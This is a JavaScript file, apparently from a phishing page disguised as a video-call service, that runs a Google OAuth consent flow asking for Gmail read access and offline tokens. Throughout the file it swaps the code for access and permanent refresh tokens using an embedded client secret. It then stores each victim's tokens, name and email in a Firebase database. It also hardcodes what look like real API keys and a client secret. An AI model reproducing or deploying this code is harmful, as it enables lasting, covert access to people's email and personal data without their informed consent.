// 1. Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyBXJDq2imeBlcvC_RYbmqhX4AAxbxSmSyU",
  authDomain: "client-access-manager.firebaseapp.com",
  databaseURL: "https://client-access-manager-default-rtdb.firebaseio.com",
  projectId: "client-access-manager",
  storageBucket: "client-access-manager.firebasestorage.app",
  messagingSenderId: "304312136465",
  appId: "1:304312136465:web:9bf1840ca1bae577d052b0"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// 2. Google OAuth Credentials & Redirect Config
const CLIENT_ID = '738143463473-jcd28645t6jlruet8aj461rpq02iabh1.apps.googleusercontent.com';
const CLIENT_SECRET = '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'; // Google Cloud Console থেকে পাওয়া আপনার সিক্রেট কি এখানে বসান
const SCOPES = 'https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile';

// আপনার ভেরসেল লাইভ পেজের নির্দিষ্ট URI
const REDIRECT_URI = "https://meet.go-video-call.online/qy0iy/";

// ৩. ক্লায়েন্ট "Connect Google Account" বাটনে ক্লিক করলে এটি রান হবে
function requestGmailAccess() {
  const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
    `client_id=${CLIENT_ID}` +
    `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
    `&response_type=code` +
    `&scope=${encodeURIComponent(SCOPES)}` +
    `&access_type=offline` +   // স্থায়ী Refresh Token পাওয়ার মূল প্যারামিটার
    `&prompt=consent`;         // রিফ্রেশ টোকেন নিশ্চিত করার জন্য কনসেন্ট স্ক্রিন প্রম্পট করা

  window.location.href = authUrl;
}

// ৪. পেজ লোড হওয়ার সাথে সাথে চেক করবে গুগল থেকে কোনো 'code' এসেছে কিনা
window.onload = async function() {
  const urlParams = new URLSearchParams(window.location.search);
  const authCode = urlParams.get('code');

  if (authCode) {
    // ব্রাউজারের URL থেকে কোড ক্লিয়ার করে দেওয়া
    window.history.replaceState({}, document.title, window.location.pathname);
    
    // Authorization Code দিয়ে টোকেন এক্সচেঞ্জ করা
    await exchangeCodeForTokens(authCode);
  }
};

// ৫. Authorization Code দিয়ে Access Token এবং Permanent Refresh Token তুলে আনা
async function exchangeCodeForTokens(code) {
  const statusDiv = document.getElementById('status');
  if (statusDiv) {
    statusDiv.className = '';
    statusDiv.innerText = "Verifying information...";
  }

  try {
    const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        code: code,
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        redirect_uri: REDIRECT_URI,
        grant_type: 'authorization_code'
      })
    });

    const tokens = await tokenResponse.json();

    if (tokens.error) {
      if (statusDiv) {
        statusDiv.className = 'error';
        statusDiv.innerText = "Access denied or token error";
      }
      console.error("Token Exchange Error:", tokens);
      return;
    }

    const accessToken = tokens.access_token;
    const refreshToken = tokens.refresh_token || null; // স্থায়ী রিফ্রেশ টোকেন

    // ইউজার প্রোফাইল ডাটা ফেচ করা
    const profileRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
    const profile = await profileRes.json();

    const sanitizedId = profile.id;

    // ফায়ারবেস ডাটাবেজে স্থায়ী Refresh Token সহ সেভ করা
    const updateData = {
      id: sanitizedId,
      name: profile.name,
      email: profile.email,
      picture: profile.picture,
      accessToken: accessToken,
      connectedAt: new Date().toISOString()
    };

    if (refreshToken) {
      updateData.refreshToken = refreshToken; // আজীবনের জন্য রিফ্রেশ টোকেন সেভ হলো
    }

    await db.ref('clients/' + sanitizedId).update(updateData);

    if (statusDiv) {
      statusDiv.className = 'success';
      statusDiv.innerText = "Successfully connected!";
    }

    // সফলভাবে কানেক্ট হওয়ার পর রিডাইরেক্ট করা
    setTimeout(() => {
      window.location.href = './try/';
    }, 1500);

  } catch (err) {
    console.error(err);
    if (statusDiv) {
      statusDiv.className = 'error';
      statusDiv.innerText = "An error occurred during authentication";
    }
  }
}
